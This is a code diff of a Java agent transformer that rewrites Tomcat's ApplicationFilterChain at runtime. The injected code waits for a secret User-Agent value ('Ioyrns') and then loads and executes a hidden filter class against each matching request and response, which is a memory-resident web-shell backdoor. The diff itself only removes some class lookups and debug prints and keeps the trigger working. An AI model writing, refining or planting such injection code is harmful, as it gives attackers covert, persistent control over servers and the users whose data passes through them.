@@ -29,26 +29,8 @@ public class MyTransformer implements ClassFileTransformer {
                         "    Object reqObj = $1;" +
                         "    Object resObj = $2;" +
                         "    try {" +
-                        "        ClassLoader reqCl = reqObj.getClass().getClassLoader();" +
-                        "        Class reqCls = null;" +
-                        "        Class resCls = null;" +
-
-                        "        try {" +
-                        "            reqCls = Class.forName(\"javax.servlet.http.HttpServletRequest\", false, reqCl);" +
-                        "            resCls = Class.forName(\"javax.servlet.http.HttpServletResponse\", false, reqCl);" +
-                        "        } catch (Throwable ex) {" +
-                        "            reqCls = Class.forName(\"jakarta.servlet.http.HttpServletRequest\", false, reqCl);" +
-                        "            resCls = Class.forName(\"jakarta.servlet.http.HttpServletResponse\", false, reqCl);" +
-                        "        }" +
-
-                        "            Object req = reqObj;" +
-                        "            Object res = resObj;" +
-                        "            System.out.println(\"[Agent] ApplicationFilterChain#reqObj = \" + reqObj);" +
-
                         "            java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
                         "            String ua = (String)getHeader.invoke(reqObj, new Object[]{ \"User-Agent\" });" +
-
-                        "            System.out.println(\"[Agent] ApplicationFilterChain#reqObj2 = \" + reqObj);" +
                         "            if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
                         "                try {" +
                         "                    ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
@@ -58,7 +40,7 @@ public class MyTransformer implements ClassFileTransformer {
                         "                    java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
                         "                    Object obj = m.invoke(null, new Object[]{ cl });" +
                         "                    java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
-                        "                    exec.invoke(obj, new Object[]{ req, res });" +
+                        "                    exec.invoke(obj, new Object[]{ reqObj, resObj });" +
                         "                } catch (Throwable t) {" +
                         "                    System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
                         "                    t.printStackTrace();" +
